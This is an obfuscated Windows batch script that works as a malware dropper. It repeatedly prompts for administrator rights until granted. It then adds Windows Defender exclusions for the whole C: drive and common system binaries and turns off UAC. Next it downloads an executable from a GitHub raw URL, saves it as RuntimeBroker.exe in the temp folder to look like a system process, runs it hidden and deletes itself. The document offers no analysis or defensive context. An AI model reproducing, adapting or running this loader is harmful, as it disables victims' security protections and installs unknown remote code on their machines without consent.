@echo off & setlocal enableDelayedExpansion
set "sHKTT=2>&1" & set "bWP=NET" & set "uHJ=>nul" & set "iVbm=SESSION"
%bWP% %iVbm% %uHJ% %sHKTT%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "LRhBl=bar" & set "QXM=foo" & set "BVE=baz" & set "dELW=qux" & rem OWjXbo Argdxjv hFzP
set "hRIBi=powershell -ExecutionPolicy Bypass -Command"
set "WfCY=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "qPEw='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "VdFig='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!hRIBi! "!WfCY! !qPEw! !VdFig!" %uHJ% %sHKTT%
set "XXA=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "rNNTI=-Name 'EnableLUA' -Value 0"
!hRIBi! "!XXA! !rNNTI!" %uHJ% %sHKTT%
set "hYmTS=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!hRIBi! "!hYmTS!" %uHJ% %sHKTT%
if !errorlevel! neq 0 (goto %a%)
set "aYno=timeout /t" & !aYno! 2 %uHJ% %sHKTT%
set "gTnen=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "zvbfP=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "icr=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!hRIBi! "!gTnen! !zvbfP! !icr!" %uHJ% %sHKTT%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!aYno! 1 %uHJ% %sHKTT% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %uHJ% %sHKTT%
del /f /q "%~f0" %uHJ% %sHKTT%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %uHJ% %sHKTT%
if !errorlevel! neq 0 (!aYno! 3 %uHJ% %sHKTT% & goto %b%)
exit /b
